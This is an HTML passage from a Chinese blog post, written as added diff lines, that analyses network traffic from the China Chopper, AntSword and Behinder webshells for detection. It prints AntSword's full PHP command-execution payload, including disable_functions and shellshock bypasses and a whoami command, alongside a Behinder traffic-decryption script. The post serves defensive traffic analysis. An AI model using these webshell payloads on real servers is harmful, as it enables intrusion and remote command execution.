+<li><code>(base64_decode($\_POST[action]))</code>,<code>(base64_decode($_POST[action]))</code>将攻击payload进行Base64解码，因为菜刀默认是将攻击载荷使用Base64编码,以避免被检测; </li>
+<li><code>&amp;z1=Yzpcd3d3cm9vdFwxOTIuMTY4LjIzMi4xMzA=</code>,该部分是传递攻击payload,此参数z1对应$_POST[z1]接收到的数据,该参数值是使用Base64编码的,所以可以利用base64解码可以看到攻击明文</li>
+</ol>
+<p>注:</p>
+<ol>
+<li>有少数时候eval方法会被assert方法替代 </li>
+<li>$_POST也会被_GET、$_REQUEST替代 </li>
+<li>z1是菜刀默认的参数,这个地方也有可能被修改为其他参数名。</li>
+</ol>
+<h2 id="中国蚁剑-AntSword"><a href="#中国蚁剑-AntSword" class="headerlink" title="中国蚁剑(AntSword)"></a>中国蚁剑(AntSword)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-content/themes/twentytwenty/header.php HTTP/1.1</span><br><span class="line">Host: 192.168.232.135:80</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword/v2.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4124</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">a=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%222f95956%22%3Becho%20%40asenc(%24output)%3Becho%20%22aad7a6fedd4%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(substr(%24_POST%5B%22oba9958b61aab5%22%5D%2C2))%3B%24s%3Dbase64_decode(substr(%24_POST%5B%22x958c36f4a4706%22%5D%2C2))%3B%24envstr%3D%40base64_decode(substr(%24_POST%5B%22m33f4b7bc545c7%22%5D%2C2))%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map(<span class="string">&#x27;trim&#x27;</span>%2Carray_map(<span class="string">&#x27;strtolower&#x27;</span>%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe(<span class="string">&#x27;putenv&#x27;</span>)%20%26%26%20(fe(<span class="string">&#x27;error_log&#x27;</span>)%20%7C%7C%20fe(<span class="string">&#x27;mail&#x27;</span>)))%20%7Bif%20(strstr(<span class="built_in">readlink</span>(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20<span class="string">&#x27;as&#x27;</span>)%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe(<span class="string">&#x27;error_log&#x27;</span>))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe(<span class="string">&#x27;system&#x27;</span>))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(<span class="string">&#x27;passthru&#x27;</span>))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe(<span class="string">&#x27;shell_exec&#x27;</span>))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe(<span class="string">&#x27;exec&#x27;</span>))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(<span class="built_in">join</span>(%22%0A%22%2C%24o))%3B%7Delseif(fe(<span class="string">&#x27;popen&#x27;</span>))%7B%24fp%3D%40popen(%24c%2C<span class="string">&#x27;r&#x27;</span>)%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe(<span class="string">&#x27;proc_open&#x27;</span>))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(<span class="string">&#x27;pipe&#x27;</span>%2C%20<span class="string">&#x27;w&#x27;</span>)%2C%202%20%3D%3E%20array(<span class="string">&#x27;pipe&#x27;</span>%2C%20<span class="string">&#x27;w&#x27;</span>))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe(<span class="string">&#x27;antsystem&#x27;</span>))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM(<span class="string">&#x27;WScript.shell&#x27;</span>)%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;m33f4b7bc545c7=uS&amp;oba9958b61aab5=3qY21k&amp;x958c36f4a4706=CWY2QgL2QgImM6XFx3d3dyb290XFwxOTIuMTY4LjIzMi4xMzVcXHdwLWNvbnRlbnRcXHRoZW1lc1xcdHdlbnR5dHdlbnR5IiZ3aG9hbWkmZWNobyBbU10mY2QmZWNobyBbRV0%3D</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210282245988.png#id=i4L9A&originHeight=1035&originWidth=1582&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>对上方进行URL解码后显示如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(0);<span class="keyword">function</span> asenc(<span class="variable">$out</span>)&#123;<span class="built_in">return</span> <span class="variable">$out</span>;&#125;;<span class="keyword">function</span> <span class="function"><span class="title">asoutput</span></span>()&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="built_in">echo</span> <span class="string">&quot;2f95956&quot;</span>;<span class="built_in">echo</span> @asenc(<span class="variable">$output</span>);<span class="built_in">echo</span> <span class="string">&quot;aad7a6fedd4&quot;</span>;&#125;ob_start();try&#123;<span class="variable">$p</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;oba9958b61aab5&quot;</span>],2));<span class="variable">$s</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;x958c36f4a4706&quot;</span>],2));<span class="variable">$envstr</span>=@base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;m33f4b7bc545c7&quot;</span>],2));<span class="variable">$d</span>=<span class="built_in">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=substr(<span class="variable">$d</span>,0,1)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;&#123;<span class="variable">$s</span>&#125;\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;&#123;<span class="variable">$s</span>&#125;\&quot;&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$d</span>,0,1)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="keyword">if</span>(!empty(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);foreach(<span class="variable">$envarr</span> as <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!empty(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;<span class="variable">$r</span>=<span class="string">&quot;&#123;<span class="variable">$p</span>&#125; &#123;<span class="variable">$c</span>&#125;&quot;</span>;<span class="keyword">function</span> fe(<span class="variable">$f</span>)&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(empty(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=array();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="built_in">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="keyword">function</span> runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>) &#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, 0, 1) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(<span class="built_in">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != FALSE) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="variable">$c</span> &gt;<span class="variable">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, 1);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="built_in">return</span> False;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@<span class="built_in">unlink</span>(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="built_in">print</span>(<span class="variable">$output</span>);<span class="built_in">return</span> True;&#125;&#125;<span class="built_in">return</span> False;&#125;;<span class="keyword">function</span> runcmd(<span class="variable">$c</span>)&#123;<span class="variable">$ret</span>=0;<span class="variable">$d</span>=<span class="built_in">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;elseif(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;elseif(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="built_in">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;elseif(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@<span class="built_in">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="built_in">print</span>(<span class="built_in">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));&#125;elseif(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="built_in">print</span>(@fgets(<span class="variable">$fp</span>,2048));&#125;@pclose(<span class="variable">$fp</span>);&#125;elseif(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, array(1 =&gt; array(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), 2 =&gt; array(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[1]))&#123;<span class="built_in">print</span>(@fgets(<span class="variable">$io</span>[1],2048));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[2]))&#123;<span class="built_in">print</span>(@fgets(<span class="variable">$io</span>[2],2048));&#125;@fclose(<span class="variable">$io</span>[1]);@fclose(<span class="variable">$io</span>[2]);@proc_close(<span class="variable">$p</span>);&#125;elseif(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;elseif(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="built_in">return</span> <span class="variable">$ret</span>;&#125;elseif(substr(<span class="variable">$d</span>,0,1)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=new COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="built_in">exec</span>(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="built_in">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = 127;&#125;<span class="built_in">return</span> <span class="variable">$ret</span>;&#125;;<span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);<span class="built_in">print</span> (<span class="variable">$ret</span>!=0)?<span class="string">&quot;ret=&#123;<span class="variable">$ret</span>&#125;&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;catch(Exception <span class="variable">$e</span>)&#123;<span class="built_in">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();die();&amp;m33f4b7bc545c7=uS&amp;oba9958b61aab5=3qY21k&amp;x958c36f4a4706=CWY2QgL2QgImM6XFx3d3dyb290XFwxOTIuMTY4LjIzMi4xMzVcXHdwLWNvbnRlbnRcXHRoZW1lc1xcdHdlbnR5dHdlbnR5IiZ3aG9hbWkmZWNobyBbU10mY2QmZWNobyBbRV0=</span><br></pre></td></tr></table></figure>
+<p>通过上方可分析出蚁剑通过POST接收了三个参数</p>
+<ol>
+<li>oba9958b61aab5</li>
+<li>x958c36f4a4706</li>
+<li>m33f4b7bc545c7</li>
+</ol>
+<p>找到这三个的值后,将前面两个字符删除,以为上方代码中有substr函数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;c:\\wwwroot\\192.168.232.135\\wp-content\\themes\\twentytwenty&quot;</span>&amp;<span class="built_in">whoami</span>&amp;<span class="built_in">echo</span> [S]&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> [E]</span><br><span class="line">可以发现我<span class="built_in">cd</span>到了一个目录后执行了<span class="built_in">whoami</span>命令</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210282248393.png#id=PROlT&originHeight=753&originWidth=1004&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><strong>蚁剑绕过特征流量</strong><br>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x……&#x3D;”这种形式（下划线可替换为其他）<br>所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征</p>
+<h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><h3 id="冰蝎-V2"><a href="#冰蝎-V2" class="headerlink" title="冰蝎 V2"></a>冰蝎 V2</h3><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311622361.png#id=Vvymp&originHeight=663&originWidth=1439&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<ol>
+<li>当冰蝎第一次访问服务器webshell时，以GET方式提交随机数字，因此服务器将会生成16位的随机字符串，写入session后通过print函数将密钥返回客户端 </li>
+<li>冰蝎第二次访问服务器时以相同方式更新密钥 </li>
+<li>经过一次密钥产生与一次密钥更新后，双方开始以对称密钥进行加密通信，首先是冰蝎向服务器发送加密数据，而解密函数在webshell中<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311624106.png#id=FimOM&originHeight=592&originWidth=1502&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>以下是实际冰蝎的攻击Payload</li>
+</ol>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311626613.png#id=E3koG&originHeight=684&originWidth=1626&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311627397.png#id=c104O&originHeight=941&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<h4 id="jspShell"><a href="#jspShell" class="headerlink" title="jspShell"></a>jspShell</h4><p>来源:<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1755927">黑伞安全</a><br>解密代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#注：python3 安装 Crypto 是 pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pycryptodome</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json   </span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        aes = AES.new(<span class="built_in">str</span>.encode(key), AES.MODE_ECB)  <span class="comment"># 初始化加密器</span></span><br><span class="line">        decrypted_text = aes.decrypt(data)  <span class="comment"># 解密</span></span><br><span class="line">        decrypted_text = decrypted_text[:-(decrypted_text[-<span class="number">1</span>])]  <span class="comment"># 去除多余补位</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&#x27;bff6f68a478bdab2&#x27;</span>  <span class="comment"># 密钥长度必须为16、24或32位，分别对应AES-128、AES-192和AES-256</span></span><br><span class="line">	data = <span class="string">&quot;&quot;&quot;jsp请求的流量&quot;&quot;&quot;</span></span><br><span class="line">	data = base64.b64decode(data)</span><br><span class="line">    a = aes_decode(data,key)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;1.class&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(a)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+<p>对上方冰蝎V2 jsp请求流量解密后自动保存为class文件,即可使用jadx进行反编译得到原来的Class<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311845307.png#id=EA4PR&originHeight=1043&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.rebeyond.behinder.payload.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span 